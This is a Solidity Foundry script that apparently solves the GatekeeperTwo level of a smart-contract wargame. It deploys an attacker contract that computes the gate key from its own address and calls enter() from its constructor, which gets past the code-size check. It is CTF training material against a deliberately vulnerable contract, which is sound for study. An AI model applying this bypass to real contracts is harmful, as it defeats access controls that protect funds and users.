// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "../src/14-GatekeeperTwo.sol";
import {GatekeeperTwoFactory} from "../src/GatekeeperTwoFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract GatekeeperTwoSolution is Script {
    GatekeeperTwo public gatekeeperLevel;
    address payable instanceAddress =
        payable(0x4472430c8ACB3528Be560315d852E21DCf8c5889);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        gatekeeperLevel = GatekeeperTwo(instanceAddress);

        console.log("Entrant before attack: %s", gatekeeperLevel.entrant());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attacker(gatekeeperLevel);
        vm.stopBroadcast();

        console.log("Entrant after attack: %s", gatekeeperLevel.entrant());

        validate();
    }

    function validate() internal {
        bool isValidated = new GatekeeperTwoFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker {
    constructor(GatekeeperTwo _level) {
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );
        (bool success, ) = address(_level).call(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
    }
}
